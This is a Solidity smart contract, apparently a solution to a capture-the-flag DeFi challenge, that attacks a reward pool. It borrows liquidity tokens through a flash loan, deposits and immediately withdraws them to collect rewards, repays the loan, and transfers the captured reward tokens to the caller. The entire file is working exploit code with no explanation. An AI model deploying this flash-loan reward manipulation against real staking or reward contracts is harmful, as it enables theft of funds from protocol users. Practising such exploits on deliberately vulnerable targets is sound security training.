pragma solidity ^0.6.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract RewarderDrain {

    address private rewardPool;
    TheRewarderPool public pool;

    constructor (address _rewardPool) public {
        rewardPool = _rewardPool;
        pool = TheRewarderPool(_rewardPool);
    }

    function drain (address flash, uint256 amount) public {
        FlashLoanerPool(flash).flashLoan(amount);
        pool.rewardToken().transfer(msg.sender, pool.rewardToken().balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        pool.liquidityToken().approve(rewardPool, amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        pool.liquidityToken().transfer(msg.sender, amount);
    }

}